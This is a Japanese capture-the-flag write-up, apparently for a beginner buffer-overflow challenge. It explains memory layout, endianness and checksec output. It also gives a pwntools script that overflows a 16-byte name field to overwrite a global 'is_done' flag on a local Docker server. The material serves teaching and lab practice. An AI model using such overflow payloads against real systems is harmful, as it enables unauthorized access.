## 事前知識
### Buffer Overflow
データをメモリに書き込む際に、想定された枠を超えて書き込みをすることで、範囲外の領域に書き込みをしてしまうことです。

![bof](./bof.jpg)

### 変数が保存されるメモリ領域
変数には大きく分けてグローバル変数とローカル変数の2種類があります。前者は、初期値を持つ場合は`.data`というメモリ領域に配置され、初期値を持たない場合(0で初期化されている場合も含む)は`.bss`というメモリ領域に配置されます。これらの変数は、アドレスの値が小さい方から大きい方へ順に配置されます。一方で、後者は`stack`に配置され、アドレスの値が大きい方から小さい方へ順に配置されます。また、`malloc`のように、決まった領域を確保する場合は`heap`という領域にメモリが確保されます。こちらは、アドレスの値が小さい方から大きい方へ順に配置されます。

### メモリの配置(little endianとbig endian)
値を上位アドレスから下位アドレスの順に格納していく(取り扱う)方法をlittle endian、逆に値を下位アドレスから上位アドレスの順に格納していく(取り扱う)方法をbig endianと呼びます。

例えば、`0x1337`を格納する場合、

- 32bit-little-endian
  - `37 13 00 00`
- 64bit-little-endian
  - `37 13 00 00 00 00 00 00`
- 32bit-big-endian
  - `00 00 13 37`
- 64bit-big-endian
  - `00 00 00 00 00 00 13 37`

どちらかは`$ file`コマンドでアーキテクチャから確認すると良いですが、little endianのことが多いです。

### checksec
実行ファイルが持っているセキュリティ機構をを読みやすい形式で表示するシェルスクリプトです。
実行すると下記の通り表示されます。

```bash
$ checksec super_easy
[*] '/home/user/work/taskctf21/pwn/super_easy/dist/super_easy'
    Arch:     amd64-64-little   <- Architecture は amd64-64-little
    RELRO:    Full RELRO        <- RELocation REadOnly の略で、GOT Overwrite という攻撃ができない設定
    Stack:    Canary found      <- スタック上での Buffer Overflow を防ぐための機構が有効である設定
    NX:       NX enabled        <- 実行する必要のないデータを実行できなくする No eXecute bit という機構が有効である設定
    PIE:      PIE enabled       <- Position Independent Executable の略で、既知のアドレスが存在しない設定
```

## 方針
`is_done`を0以外にする

## 解法
サーバの起動

```bash
docker-compose up -d
```

```python
from pwn import *

ADDR = '127.0.0.1'
PORT = 30002

io = remote(ADDR, PORT)

print(io.recvuntil(b'name\n'))

payload = b'A' * 16 # name用の部分を全部埋める
payload += b'\x01\x00\x00\x00' # is_doneに1を入れる

io.sendline(payload)
io.interactive()
```

## コメント
buffer overflow問題です。Canaryが有効ですが、構造体の変数はグローバルなのであまり気にしなくて良さそうです。よくわからないけど通った方もいたのではないでしょうか？
